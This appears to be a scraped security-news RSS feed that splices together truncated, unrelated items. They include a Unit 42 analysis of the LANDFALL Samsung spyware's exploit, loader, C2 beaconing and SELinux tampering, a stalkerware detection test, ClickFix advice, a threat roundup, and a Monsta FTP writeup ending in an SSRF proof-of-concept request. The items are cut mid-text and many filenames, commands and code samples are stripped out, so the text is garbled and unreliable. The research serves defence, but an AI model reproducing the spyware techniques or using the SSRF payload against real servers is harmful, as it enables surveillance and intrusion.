WhatsApp Image</title><link>https://cybersecuritynews.com/samsung-0-day-exploited-via-whatsapp/</link><author></author><category>security</category><pubDate>Sat, 8 Nov 2025 08:06:36 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

To deliver the spyware, attackers exploited a zero-day vulnerability (CVE-2025-21042) in Samsung’s Android image processing library. The specific flaw LANDFALL exploited, CVE-2025-21042, is not an isolated case but rather part of a broader pattern of similar issues found on multiple mobile platforms.This vulnerability was actively exploited in the wild before Samsung patched it in April 2025, following reports of in-the-wild attacks. However, the exploit itself — and the commercial-grade spyware used with it — have not yet been publicly reported and analyzed.LANDFALL was embedded in malicious image files (DNG file format) that appear to have been sent via WhatsApp. This method closely resembles an exploit chain involving Apple and WhatsApp that drew attention in August 2025. It also resembles an exploit chain that likely occurred using a similar zero-day vulnerability (CVE-2025-21043) disclosed in September. Our research did not identify any unknown vulnerabilities in WhatsApp.Importantly, our finding predates these disclosures — the LANDFALL campaign was already operating in mid-2024, using the zero-day Android/Samsung vulnerability (CVE-2025-21042) months before it was fixed.The vulnerability has been patched since April 2025, so there is no ongoing risk to current Samsung users. In September, Samsung also patched another zero-day vulnerability (CVE-2025-21043) in the same image processing library, further protecting against this type of attack.Our research looks back at historical exploitation that occurred before the patch, providing rare visibility into an advanced spyware operation that was publicly unreported.LANDFALL is Android spyware specifically designed against Samsung Galaxy devices, used in targeted intrusion activities within the Middle East.LANDFALL enabled comprehensive surveillance, including microphone recording, location tracking and collection of photos, contacts and call logs.The spyware is delivered through malformed DNG image files exploiting CVE-2025-21042 — a critical zero-day vulnerability in Samsung’s image processing library, which was exploited in the wild.The exploit chain possibly involved zero-click delivery using maliciously crafted images, similar to recent exploit chains seen on iOS and Samsung Galaxy.The campaign shares infrastructure and tradecraft patterns with commercial spyware operations in the Middle East, indicating possible links to private-sector offensive actors (PSOAs).LANDFALL remained active and undetected for months.Palo Alto Networks customers are better protected through the following products and services:LANDFALL Spyware DiscoveryIn mid-2025, following the public disclosure of an exploit chain targeting iOS devices, we searched for samples of the iOS exploit. This led to our discovery of the Android spyware that we called LANDFALL.Specifically, Unit 42 discovered several samples of DNG image files containing Android spyware used in an exploit chain targeting Samsung Galaxy devices. Our analysis confirmed these samples exploit CVE-2025-21042 to deliver LANDFALL, possibly via zero-click exploits on messaging applications.Beginning the Hunt: The iOS Exploit Chain and How It Made Us WonderIn August 2025, Apple issued OS security updates for its various products to address CVE-2025-43300, a zero-day vulnerability affecting DNG image parsing that attackers reportedly exploited in the wild.That same month, WhatsApp reported a zero-day vulnerability for CVE-2025-55177 that was chained with the image-processing vulnerability for Apple platforms in sophisticated attacks targeting iOS devices. The WhatsApp vulnerability allowed attackers to force devices to process content from arbitrary URLs.When the two vulnerabilities were combined in an exploit chain, this enabled zero-click remote code execution through maliciously crafted images sent via WhatsApp messages.Given the disclosure of this in-the-wild exploit chain and the absence of publicly available exploit samples, we initiated a hunt for this activity. Our search led to the discovery of several previously undetected DNG image files containing embedded Android spyware that were uploaded to VirusTotal throughout 2024 and early 2025.Judging by their filenames (e.g.,  and ), attackers likely delivered these samples via WhatsApp. Our analysis of the embedded spyware indicates it is designed for Samsung Galaxy devices.Malformed DNG Image Files: A New Attack Vector TrendOur analysis of LANDFALL spyware began with our discovery of malformed DNG image files. DNG stands for Digital Negative, and it is a raw image file format based on the TIFF image format. The malformed DNG image files we discovered have an embedded ZIP archive appended to the end of the file. Figure 1 shows one of these samples in a hex editor, indicating where the ZIP archive content begins near the end of the file.Our analysis indicates these DNG files exploit CVE-2025-21042, a vulnerability in Samsung's image-processing library  that Samsung patched in April 2025. The exploit extracts shared object library () files from the embedded ZIP archive to run LANDFALL spyware. Figure 2 below shows a flowchart for this spyware.Table 1 shows the DNG image samples we discovered.Filenames with strings like  and  imply attackers could have attempted to deliver the embedded Android spyware via WhatsApp. This matches earlier public reporting of similar DNG image-based exploitation through WhatsApp targeting Apple devices. Furthermore, WhatsApp researchers identified and reported a similar DNG vulnerability, CVE-2025-21043, to Samsung.Delivering LANDFALL Spyware: Mobile Device Malware Exploit ChainsTypically, mobile device malware distributed through exploits requires a chain of exploits across different vulnerabilities for successful infection. Various studies have documented cases of at least two vulnerabilities when distributing spyware, but modern exploit chains for spyware are far more complex [PDF], linking multiple vulnerabilities to compromise mobile devices and gain privileges.We have yet to discover any further exploits associated with this activity.LANDFALL Spyware AnalysisLANDFALL is Android spyware specifically designed for Samsung Galaxy devices, likely used in targeted intrusion activities within the Middle East. This modular spyware is engineered for espionage and data exfiltration.The infection chain for LANDFALL involves an exploit for CVE-2025-21042, a vulnerability in Samsung's image-processing library tracked by the vendor as Samsung Vulnerabilities and Exposures (SVE) designator SVE-2024-1969. We believe a full attack chain would follow a pattern of potential zero-click remote code execution, beginning with the delivery of the malformed DNG images.Two components of LANDFALL spyware are embedded within the malformed DNG images and would be extracted and executed, following a successful exploit:Loader (): An ARM64 ELF shared object (106 KB, stripped and dynamically linked) that serves as the main backdoor.SELinux Policy Manipulator (): Extracted from an XZ-compressed ELF binary, this component is designed to manipulate the device's SELinux policy to grant LANDFALL elevated permissions and aid persistence. (See Appendix A - SELinux Policy Manipulation.)Table 2 shows the LANDFALL component files embedded within the malicious DNG samples.Our analysis indicates LANDFALL is multi-component Android spyware designed for monitoring and data exfiltration.Our analysis focuses on the  component, which serves as the initial loader for a broader LANDFALL framework. In its own debug artifacts, the component refers to itself as “Bridge Head.” This will be of interest later when we discuss possible relationships between LANDFALL and known spyware groups.LANDFALL’s Potential CapabilitiesThe  component of LANDFALL contains numerous debug and status strings, but it does not contain the logic that actually references most of these strings. This suggests that  would download additional components for these capabilities. Our analysis of embedded command strings and execution paths within the  file provides insight into the broader LANDFALL's potential capabilities.Taking inventory of installed applicationsAccessing location servicesDatabases on the device (browsing history, etc.)Execution, Loading and PersistenceLoading native shared object () modulesLoading and executing DEX files from memory and diskExecuting arbitrary commandsModifying SELinux policy via compressed binaryMonitoring WhatsApp Media directory for additional payloadsRegistering WhatsApp web clientManipulating the file system in Android app directoriesManipulating the file systemEvasion and Defense AvoidanceDetecting TracerPid debuggerDetecting Frida instrumentation frameworkDetecting Xposed frameworkDynamic library loading with namespace manipulationCertificate pinning for C2 communicationsCleaning up WhatsApp images payloadGalaxy S23 Series (S91[168]BXX.*)Galaxy S24 Series (S921BXXU1AWM9, S92[168]BXX.*)Galaxy Z Fold4 (F936BXXS4DWJ1)Galaxy S22 (S901EXXS4CWD1)Galaxy Z Flip4 (F721BXXU1CWAC)Figure 3 shows an example of the targeted device model strings in a  sample of LANDFALL.The  component of LANDFALL communicates with its C2 server over HTTPS using a non-standard, ephemeral TCP port. Before the HTTPS traffic, it can initiate ping traffic as detailed in the Communication With the C2 Server section of Appendix B. For HTTPS traffic,  initiates contact with a POST request containing detailed device and spyware information, such as:Figure 4 shows an interpretation of this initial POST request, where we use  to show how this request would be structured. Of note, LANDFALL does not use  to generate this traffic.The initial beacon traffic is an HTTP POST request to the C2 server with the following parameters:: The protocol version (e.g., ): The protocol version (e.g., ""): The message type (e.g., ): The agent's unique identifier: An upload identifier: A command identifier: The source of the request (e.g., ): The incremental build version (e.g., ): The effective user ID of the process: The path to the  binary on the device: The runner mode (e.g., )Configuration of b.so FileThe  file's configuration is managed through a combination of hard-coded default values and an encrypted JSON object embedded within itself. This configuration includes C2 details, cryptographic keys and unique identifiers for the agent and commands.Figure 5 shows an example of this configuration.This  component of LANDFALL also contains a number of hard-coded configuration values. These are used as default values if they are not provided in the encrypted JSON object. We do not yet fully understand the purpose of some of these values. Table 3 shows these hard-coded default configuration values.C2 Infrastructure for LANDFALL SpywareBased on our analysis of these samples, we identified six C2 servers for LANDFALL, shown below in Table 4.How LANDFALL Fits Into the Larger PictureLANDFALL is one example of a larger pattern of exploit chains affecting mobile devices, related to DNG image processing vulnerabilities.The LANDFALL campaign's use of a malformed DNG file highlights a significant, recurring attack vector: the targeting of vulnerabilities within DNG image processing libraries. The specific flaw LANDFALL exploited, CVE-2025-21042, is not an isolated case but rather part of a broader pattern of similar issues found on multiple mobile platforms. In fact, earlier in 2025, Samsung identified another DNG flaw in the same Samsung library, CVE-2025-21043, and the parallel exploit chain on iOS was identified that leveraged CVE-2025-43300 in Apple iOS and CVE-2025-55177 in WhatsApp.Relationship to CVE-2025-21043 (SVE-2025-1702)Our analysis revealed a possible connection to a separate vulnerability in the same library, CVE-2025-21043 (SVE-2025-1702), which Samsung patched in its September 2025 security update. While it was not exploited in the LANDFALL samples we discovered, the similarities between the exploit for LANDFALL (CVE-2025-21042) and this vulnerability (CVE-2025-21043) are striking. Both vulnerabilities were publicly disclosed around the same time and both are connected to DNG image file processing delivered through mobile communication applications.In August 2025, Apple addressed CVE-2025-43300, a zero-day vulnerability impacting DNG image parsing, which was actively exploited in the wild, to enable zero-click remote code execution through malicious images sent via mobile communication applications.We cannot confirm whether this chain was used to deliver an equivalent of LANDFALL to iOS, or whether it is the same threat actor behind the two. However, this parallel development in the iOS ecosystem, combined with the disclosure of the Samsung and Apple vulnerabilities just a few weeks apart, highlights a broader pattern of DNG image processing vulnerabilities being leveraged in sophisticated mobile spyware attacks.July 2024 – February 2025: Initial samples of malicious DNG image files carrying LANDFALL are first submitted on VirusTotal in July 2024, with additional samples appearing periodically over the next several months.
The DNG files exploit a vulnerability in Samsung’s Android image processing library (SVE-2024-1969, CVE-2025-21042)Samsung issues a firmware update to address the vulnerability, SVE-2024-1969, later known as CVE-2025-21042 when publicly disclosed. Parallel developments occur.
Apple patches a zero-day vulnerability impacting DNG image parsing, which was actively exploited in the wild (CVE-2025-43300)WhatsApp discloses a vulnerability (CVE-2025-55177) that was chained with Apple’s DNG image parsing zero-day vulnerability (CVE-2025-43300)We discovered DNG image files exploiting CVE-2025-21042 to deliver Android spyware that we identified as LANDFALL.WhatsApp disclosed to Samsung CVE-2025-21043 — another DNG-related zero-day vulnerability in Samsung Galaxy devices. Samsung issues mobile device firmware updates for CVE-2025-21043 (SVE-2025-1702). Concurrently, it assigns CVE-2025-21042 (SVE-20254-1969) to the earlier vulnerability that previously had no CVE designator.Analysis of VirusTotal submission data for the malicious DNG files indicates potential targets in Iraq, Iran, Turkey and Morocco.Relationship to Known Spyware GroupsWhile we were unable to recover every component of the LANDFALL framework, it is clear that the tool is commercial grade. It may have utilized several zero-day exploits in its infection chain.Such tools are often developed and sold as commercial spyware and attributed to groups known as private sector offensive actors (PSOAs), who are often legitimate legal entities. Reportedly, these groups provide services to government entities.We were not able at this time to officially attribute LANDFALL activity to a known PSOA or threat actor. Unit 42 tracks the activity related to CVE-2025-21042 and LANDFALL as CL-UNK-1054.Two aspects are notable and worth highlighting.First, LANDFALL's C2 infrastructure and domain registration patterns share similarities to infrastructure associated with Stealth Falcon as observed by Unit 42. These similarities are based on various publicreports, as well as Stealth Falcon activity we have analyzed for targets in the Middle East.Second, in its own debug artifacts, the spyware component we analyzed refers to itself as “Bridge Head.” Of note, the term Bridge Head is a common nickname used by some private-sector offensive cyber companies (including NSO, Variston [PDF], Cytrox and Quadream) for first-stage loaders. However, this naming convention alone does not constitute a direct attribution link.While this is a common name used in commercial mobile spyware to describe loaders, it draws similarities to the Heliconica framework. This framework also contains references to “BridgeHead,” as Google TAG reported about spyware vendor Variston. Google identified Variston as a Barcelona-based PSOA (provider of exploits). Further analysis from Google and other reports indicated Variston's tooling was supplied to clients in the UAE through a reseller named Protect Electronic Systems (or Protected AE).This potential provider-client link to the UAE is noteworthy, as Microsoft and others reported that Stealth Falcon also operates heavily out of that country. Variston reportedly ceased operations in early 2025 following its public exposure.As of October 2025, except in infrastructure, we have not observed direct overlaps between the mobile campaigns of LANDFALL and the endpoint-based activity from Stealth Falcon, nor direct strong links with Stealth Falcon. However, the similarities are worth discussion.The discovery of LANDFALL spyware reveals a campaign targeting Samsung Android devices. The exploit chain involves CVE-2025-21042, a vulnerability that was patched by Samsung in April 2025. The presence of this spyware within DNG image files with WhatsApp-related naming conventions likely indicates attackers attempted to deliver the exploit through a messaging application.From the initial appearance of samples in July 2024, this activity highlights how sophisticated exploits can remain in public repositories for an extended period before being fully understood.The analysis of the loader reveals evidence of commercial-grade activity. The LANDFALL spyware components suggest advanced capabilities for stealth, persistence and comprehensive data collection from modern Samsung devices.However, we have not directly analyzed the next-stage components of the spyware. Additional details on this or on the exact delivery method would provide even more insight into the malicious activity.Palo Alto Networks customers are better protected from LANDFALL Android spyware through the following products:North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)Europe and Middle East: +31.20.299.3130Australia: +61.2.4062.7950Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.

This file provides a capability to bypass system security controls. It is decompressed from  to  and executed.Rather than containing hard-coded rules,  implements a generic engine that can dynamically parse and load new SELinux policy statements from an external source, modifying the running policy in memory.Relevant and unique exported functions:: Load policy from binary data: Add individual policy statements: Serialize modified policy: Clean up policy objectsAppendix B: Additional Details on LANDFALL Spyware AnalysisThis appendix details the observed capabilities of the loader component of LANDFALL, as well as those we infer exist in other modules of the complete LANDFALL framework that we have not yet accessed.LANDFALL’s Bridge Head, named on the disk as , is loaded by an exploit on the device. Immediately after being loaded post‑exploit, LANDFALL parses  from the environment to avoid inheriting upstream preloads. It reads the effective user ID via  and stores it globally so later branches can adjust behavior for root versus non‑root. Then it calls into the main routine.It gathers process basics (parent , , Android build string), reads a  flag from the environment variable  and takes a copy of it for later actions. This value (typically  for interactive or  for passive) will be reported to the command and control and determine how it launches a later staged payload. It resolves its own mapped path, selects the app-private base at  as its working directory and then constructs two child paths there. One path is for the staged download and one is for the final  used for execution.LANDFALL reads and XOR-decrypts a JSON configuration directly from its own file. The spyware normalizes configuration by writing internal defaults back into the parsed object: numeric fields default when missing or zero, and certain booleans are coerced to fixed values regardless of the supplied configuration. Finally, it checks that a public key (X.509 DER) is present in the configuration and exits otherwise.Table 8 summarizes the configuration normalization performed at this stage.Communication With the C2 ServerOnce configuration is complete,  loads the necessary network and encryption functions, sets up its SSL environment, and prepares a secure client context for future HTTPS communication. If any part of this setup fails, it exits cleanly rather than risk a partial setup.Before entering the C2 beaconing loop, it optionally emits telemetry. If it is running as root, it formats a concise "started" line that includes:A fixed version marker (e.g., )It then sends that via a POST request to the C2 server, as shown below.If the runner mode is , it prepares the SELinux helper first: it locates the compressed policy helper (), inflates it via an internal XZ decoder into a fresh buffer, and writes the result to . Then it beacons to the C2 server by sending ping using the hyphen‑stripped  as payload. The outcome doesn’t gate the rest of the flow, and it serves as an operator telemetry.An example of code for an ‑mode  follows.Only then does the main C2 beaconing loop begin. It records time zero and enforces a strict wall‑clock budget of about 7,200 seconds () for the entire session.It zeros two large, reusable path buffers: one for the raw blob that may arrive from the server, and a sibling for the decompressed shared object. Both paths live under the app‑private working directory (e.g., ). With the paths ready, it contacts the command and control server by building a compact, URL‑encoded style body of  pairs:A protocol/variant tag; the beacon message typeThe ,  and a fresh  (UUIDv4) for correlationThe runner flag and its on‑disk install pathWhen applicable, it computes a SHA-1 over part of the message and appends it. It uses the following Chrome User‑Agent string:Requests are directed at the configured base path (e.g., ). Before any application data is sent, it pins the TLS connection.While reading the response from the C2 server, LANDFALL checks the response status code and looks through the headers to determine the message length and type. Some status codes — particularly timeouts and a masked set of / (e.g., , ) — are treated as transient and trigger  (default 35 seconds) before retrying with a fresh connection. A not‑found response (e.g., ) is considered terminal for this run and exits the loop. If the status indicates success and a body is present, LANDFALL proceeds to staging.Staging starts by cleaning up the file system state. If an old raw blob exists at the temporary path, it removes it. It writes the raw bytes to a staging file named  under the working directory, and then, attempts to decompress them using a built‑in XZ/LZMA decoder that inflates into a pre‑allocated approximately 5 MiB buffer.On success, it writes the decompressed bytes to  (the final  path) under the working directory, clears the temporary  and sets the file mode on  to  to ensure it’s loadable in various contexts.Example XZ inflater (trimmed):With the shared object in place (), it chooses an execution strategy based on the runner flag. For interactive setups (), it exports two environment variables and launches a benign system tool synchronously:The  points at the device path where SELinux policy content is expected, allowing the preloaded code to find and apply policy at startup. Note that this  is only used in interactive mode, the passive running path omits it.For passive runs (), it launches the same tool in the background:This is done so control returns quickly while the helper initializes in another process. Internally, both are dispatched via a shell wrapper (). In both cases, it accepts only narrow success results:exit code 0 or a specific ; anything else is treated as failure and breaks out of the loopOn successful load, it formats and sends an “ended” line mirroring the opening message including:It then frees transient strings and buffers. If no payload was available, or if a transient error occurred, it checks the elapsed wall‑clock time against its approximately 7,200‑second budget. If there’s time left, it sleeps the configured interval and tries again.Finally, when the loop finishes, either after a successful loading of the next stage or due to time budget or unrecoverable errors, it unwinds cleanly. If it is running as root, it prefers a  path instead of a normal return to minimize side effects in the runtime. In all cases, it aims to leave behind only the minimum artifacts needed for the staged code to continue.Unreferenced CapabilitiesDuring reverse engineering, we identified multiple routines compiled into the  component that are not invoked by its observed control flow. These latent features appear designed for use by the follow‑on modules loaded.It is also very probable that some of these functions are leftovers from older versions of LANDFALL. They reveal concrete behaviors oriented around WhatsApp media paths, DCIM discovery, file system staging and process hygiene on Android:One routine prepares a “started” telemetry line and then interacts with the device’s media subsystem. It formats the line:
If its internal checks pass, it executes a broadcast to force a gallery rescan using the exact shell:
In the same flow, it also constructs a “newest photo” probe over DCIM using:
This pattern is consistent with harvesting the latest camera item while excluding an artifact it can plant. This routine is compiled in but not called by any other code in the sample.WhatsApp media path planter. Another routine decodes a hard-coded Base64 1x1 PNG () and searches WhatsApp’s media directories on external storage for a recent file path that matches the agent’s identifier (the UUID is first stripped of hyphens). It builds and executes a search pipeline across both default (ID 0) and multi‑user (ID 95) paths:
.If such a path is returned, it writes the decoded PNG there verbatim. This looks like a cover‑artifact or covert marker stage aimed at WhatsApp images.Another helper takes a base directory and a string and returns one matching JPEG path by executing:
It trims trailing newlines and verifies the path exists before returning.Zygote avoidance check: A process‑hygiene helper allocates a buffer for its own  and returns success only when the name does not match  or . It is designed to avoid Android’s special host processes.SELinux symbol resolver and cleanup: Two small routines handle dynamic SELinux plumbing.
One  and resolves  and  into global function pointers.The other tears this down and clears the pointers.Both exist to support  work but are not referenced by the observed code path.A more substantial routine accepts a list of file system paths. For each, it saves the current label via , invokes an internal labeler on the path, applies ownership via  and then restores the saved label with . It returns distinct negative codes when  or  fail.There is a file probe that attempts to open a path and maps the outcome to internal status codes (success, permission denied, not found, generic error). It also resets internal library state (including any previously opened SELinux handles).Map process‑execution outcome to message status: A tiny mapper converts the result of an internal command‑execution helper into message catalog codes (e.g., mapping a specific return (1) to  code  and 2–3 to ). It standardizes reporting for helpers but is not reached by the current logic.Building a device‑report JSON array: Another dormant routine constructs a cJSON array where each entry carries , a Base64‑encoded binary field, a  boolean and a textual  derived from the internal  table. It walks an input vector, reads the referenced file into memory, Base64 encodes it and appends to the array.A small string‑templating helper finds occurrences of the token  inside a JSON value and replaces them with the runtime path tracked by the .Appending  to telemetry: A diagnostic helper parses , extracts the  line, converts it to an integer, and, if greater than zero, appends a formatted key/value into the request body via the ’s string‑builder.A staging helper concatenates an existing buffer with a pseudo‑random block derived from an input string:
It seeds a byte with It XORs each subsequent byte of the input into a rolling accumulatorIt writes the accumulator bytes as a suffixIt then writes the combined buffer to a given file path via the ’s writerA two‑step installer/uninstaller pair uses three config keys: ,  and . The main routine checks that all three are set, copies the backup back to the origin if needed and then deletes the payload file. It returns distinct status codes (//) that map to the message catalog entries for “no config,” “failed move” and “failed unlink.” A sibling routine conditionally creates or truncates the backup file ( with mode “”) when a global persistence flag is set.Battery percentage via : A utility reads battery capacity from the system’s power‑supply , checking two common locations:  and .Two routines set up and finalize the working directory under app‑private storage.
The first creates the directory tree, applies mode  (), temporarily adds execute to the parent and copies the resolved path into . And, when running as , it attempts to mount a  at that location to keep artifacts in memoryThe second (cleanup/finalize) can, when root and the directory exists, run  and ship the result home. It then restores the parent directory’s original mode and frees the path bufferProcess discovery by SELinux context and by : Two search helpers iterate , building and reading per‑PID files.
One compares  against a target SELinux context and then confirms the process has PPID 1The other compares  against a target On a match, they write the PID to an out‑parameter and return successDebug‑printing a variant array: A developer‑facing routine prints a small typed array structure. It formats type names from a table, dumps short byte arrays inside square brackets and emits a single character for a specific type, one element per line. This looks like leftover debugging and is not invoked by active code.None of these helpers are exercised by this component’s main execution loop. Their presence is consistent with a staged architecture in which subsequently loaded shared objects, forming the complete LANDFALL framework, expand collection and persistence using capabilities already compiled into this loader.]]></content:encoded></item><item><title>Is your cyberinsurance paid up?

Despite measures from both the tech industry and platform providers, stalkerware-type apps, which are apps that can be installed covertly to spy on a victim’s private life, remain a critical concern.This comprehensive assessment, developed in collaboration with Electronic Frontier Foundation (EFF), evaluated 13 leading Android security solutions against 17 diverse stalkerware-type apps. Key findings show that stalkerware persists even as providers and coalitions crack down: it’s sideloaded from developer websites, designed to evade detection, and frequently stores sensitive victim data on insecure servers, often exposing it to wider risks like public data leaks.For this test, each security app was assessed for its ability to clearly detect and report stalkerware, not just using generic labels, but with explicit warnings tailored to support possible victims.AV-Comparatives is an independent organization offering systematic testing that checks whether security software, such as PC/Mac-based antivirus products and mobile security solutions, lives up to its promises. Of the 13 security products tested in September 2025, only a few stood out for detection accuracy, clarity, and responsible alerting, with Malwarebytes the only one to score a 100% detection rate. The results show clear differences in performance between mobile security products.  stood out by detecting all stalkerware testcases, achieving a 100% detection rate. Bitdefender, ESET, Kaspersky, and McAfee followed closely with 94% each, showing consistently high effectiveness. Avast, Avira, and F-Secure also performed well, identifying 88% of the test set, while Norton and Sophos achieved moderate coverage, detecting around 82%. At the lower end, G Data (65%), Google (53%), and Trend Micro (59%) missed a substantial portion of the stalkerware.As one of the founding members of the Coalition Against Stalkerware, Malwarebytes sees this result as much more than a technical win. For us, the mission goes beyond simply blocking malicious software. Stalkerware-type apps are often used by abusers to systematically invade privacy and exert control. Their impact is highly personal, making reliable detection and safe reporting imperative.Our participation in the coalition reflects a commitment to industry best practices: preventing stalkerware-type apps from being quietly installed, giving users detailed and honest threat information, and ensuring that every detection alert is crafted with survivor safety in mind. Scoring 100% in this test validates years of advocacy and development focused on the real-world needs of victims and their supporters, which goes beyond focusing on theoretical malware samples.Ultimately, consistent leadership in stalkerware detection means standing alongside partners and survivor organizations to raise public awareness, drive safer technology, and provide every user with a clear path to reclaim their privacy. For Malwarebytes, achieving a perfect score isn’t just a mark of product quality; it’s proof of our commitment to your privacy and security.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Samsung Mobile Flaw Exploited as Zero-Day to Deploy LANDFALL Android Spyware</title><link>https://thehackernews.com/2025/11/samsung-zero-click-flaw-exploited-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxnkLkwZDN9VORq3DEpVtJQh6phis8RMKVCTHdeszGmpt2Ec7PomBirtsbg7ySqLM49GAicSD8lxHN2AhVp4VgNOcpFl2FOLflhe6NqZHfug6F79FBkmakco2bPNOZCffW-oOAzKYevoWB3iNPnn6qbX8e9I98iaNOT3gS3ZD4fKVebHaxXCLjQy4pjCeE/s1600/mobile-exploit.jpg" length="" type=""/><pubDate>Fri, 7 Nov 2025 18:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A now-patched security flaw in Samsung Galaxy Android devices was exploited as a zero-day to deliver a "commercial-grade" Android spyware dubbed LANDFALL in targeted attacks in the Middle East.

A countdown timer adds urgency, pressuring users to complete the “challenge” within a minute. When people rush instead of thinking things through, social engineering wins.Unsurprisingly, most of these pages spread through SEO-poisoned Google search results, although they also circulate via email, social media, and in-app ads too.With ClickFix running rampant—and it doesn’t look like it’s going away anytime soon—it’s important to be aware, careful, and protected.Don’t rush to follow instructions on a webpage or prompt, especially if it asks you to run commands on your device or copy-paste code. Attackers rely on urgency to bypass your critical thinking, so be cautious of pages urging immediate action. Sophisticated ClickFix pages add countdowns, user counters, or other pressure tactics to make you act quickly.Avoid running commands or scripts from untrusted sources. Never run code or commands copied from websites, emails, or messages unless you trust the source and understand the action’s purpose. Verify instructions independently. If a website tells you to execute a command or perform a technical action, check through official documentation or contact support before proceeding.Limit the use of copy-paste for commands. Manually typing commands instead of copy-pasting can reduce the risk of unknowingly running malicious payloads hidden in copied text.Educate yourself on evolving attack techniques. Understanding that attacks may come from unexpected vectors and evolve helps maintain vigilance.

The defendants allegedly acted as BlackCat affiliates, breaching networks, stealing data, deploying encryption malware, and demanding cryptocurrency ransoms. Victims included medical, pharmaceutical, and engineering firms. Prosecutors say the ransom demands ranged from $300,000 to $10 million, with one company paying out $1.27 million. The trio faces up to 50 years each in prison if convicted.Also this week,  stolen via fraudulent IT worker schemes. The designated include Ryujong Credit Bank and Korea Mangyongdae Computer Technology Company (KMCTC), along with executives and bankers responsible for managing funds linked to ransomware attacks and UN sanctions violations. OFAC says that over the last 3 years DPRK-affiliated cybercriminals have stolen more than $3 billion in cryptocurrency using malware and social engineering. The sanctions freeze U.S. assets and warn that transactions with these entities risk secondary penalties.In Europe, . The criminals allegedly created fake crypto investment platforms that promised high returns and recruited victims through social media, cold calls, and fake endorsements from celebrity investors. Victims lost their funds while the suspects laundered the stolen assets using blockchain tools. In operations coordinated by Eurojust in Cyprus, Spain, and Germany, law enforcement seized cash, crypto, and bank accounts.The Bad | SleepyDuck Trojan Exploits Ethereum Smart Contracts to Evade Takedown, researchers say. The malware uses Ethereum smart contracts to manage its command and control (C2) communications, helping it to maintain persistence even if its main server is taken down.Initially benign when published on October 31, the infected extension, juan-bianco.solidity-vlang, became malicious after an update made the following day, by which time it had already been downloaded 14,000 times. For now, the extension remains available on Open VSX with a public warning. In total, it has been downloaded over 53,000 times.Security researchers report that SleepyDuck activates when the code editor starts, a Solidity file opens, or when a compile command runs. It disguises its malicious activity through a fake  function from , while secretly executing payloads that collect system information such as hostnames, usernames, MAC addresses, and timezones.After it is triggered, the trojan queries the Ethereum blockchain to find the fastest RPC provider, read its C2 details, and enter a polling loop for new instructions. This blockchain-based C2 redundancy means that .In response, Open VSX has introduced new security measures, including shorter token lifetimes, automated scans, revoking any leaked credentials, and working in coordination with VS Code to block emerging threats. Best practices for developers include verifying extension publishers and installing software only from trusted repositories to avoid supply-chain compromises.The Ugly | Iran-Based Actors Target U.S. Policy Experts in New Espionage CampaignBetween June and August, a newly identified threat cluster dubbed ‘UNK_SmudgedSerpent’  focused on the Middle East. The campaign, coinciding with rising Iran-Israel tensions, uses politically-themed lures related to Iranian domestic affairs and the militarization of the Islamic Revolutionary Guard Corps (IRGC).Researchers say the threat actors behind the campaign initiated attacks with benign email exchanges before introducing phishing links impersonating prominent U.S. foreign policy figures and think tank institutions like the Brookings Institution and Washington Institute. The targeted victims, over 20 U.S.-based experts on Iran-related policy, were enticed to open malicious meeting documents and login pages designed to harvest their Microsoft account credentials. In some attacks, the attackers sent URLs leading to fake MS Teams login pages but pivoted to spoofed OnlyOffice sites if the victim grew suspicious.Clicking the links led to the download of malicious MSI installers disguised as Microsoft Teams, which then deployed legitimate remote monitoring and management (RMM) software like PDQ Connect. Subsequent activity suggests attackers manually installed additional tools such as ISL Online, indicating possible hands-on-keyboard intrusion.Researchers note that the operation’s tactics mirror those of known Iranian cyberespionage groups such as TA455 (UNC1549, Smoke Sandstorm), TA453 (TunnelVision, APT 35, UNC788), and TA450 (TEMP.Zagros).

We get it. Go sit in the middle of the highway. That can also be safe, “it just depends”.Our journey began, initially, with a specific version of Monsta FTP in the “crosshairs” so to speak. Specifically, Monsta FTP  .Those of you who live/breathe version numbers of enterprise-used software, this version number likely has you frothing at the mouth. For those that aren’t, we will just tell you what the rabid already know - this is not the latest version of Monsta FTP, which at the time of our research was  published in July 2025.Wipe the froth away, and let us explain - why are we looking at an older version?Well, our research shows that a significant portion of the Internet is still not running the latest version (surprise!) and the powers-that-be had some random theory.Random theories aside, Monsta FTP has a fascinating history of vulnerabilities. Following a gut feeling of general unease, we started our endeavours by determining if previous vulnerabilities had been patched correctly.Looking through our favourite, shiniest CVE database - three (that’s 3) vulnerabilities stood out, supposedly affecting .That’s just 1 minor version before our target ! (Look at us, maths!)CVE-2022-31827 : Monsta FTP v2.10.3 was discovered to contain a Server-Side Request Forgery (SSRF) via the function performFetchRequest at HTTPFetcher.php.CVE-2022-27469 : Monsta FTP v2.10.3 was discovered to allow attackers to execute Server-Side Request Forgery (SSRF).CVE-2022-27468 : Monsta FTP v2.10.3 was discovered to contain an arbitrary file upload which allows attackers to execute arbitrary code via a crafted file uploaded to the web server.Cue the usual actions, we quickly deployed two (2) environments;One running vulnerable version  andOne running our target instance .Despite the 3 vulnerabilities reported in version , there is little to no change in the code in .In fact, the only code we were able to identify any change within was purely cosmetic.Scratching our heads and questioning reality around us, we wondered - could this mean that the vulnerabilities previously highlighted in  actually exist in later versions?After an exasperated sigh at the general state of the world, and beginning to get the feeling that this was about to become appropriately described as a ‘saga’, we continued.Within the aforementioned CVEs are a number of references - for example, CVE-2022-31827, the Server-Side Request Forgery vulnerability, references a PoC which when we blindly fired at both  and , worked.. “as expected” and was trivially reproduced:POST /application/api/api.php HTTP/1.1
Host: {{Hostname}}
Content-Length: 275
Content-Type: application/x-www-form-urlencoded

request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-Server}}","remoteUsername":"zero","initialDirectory":"/tmp/","authenticationModeName":"Password","password":"123456","port":22},"actionName":"fetchRemoteFile","context":{"source":"http://{{External-Server}}/flag.txt"}}
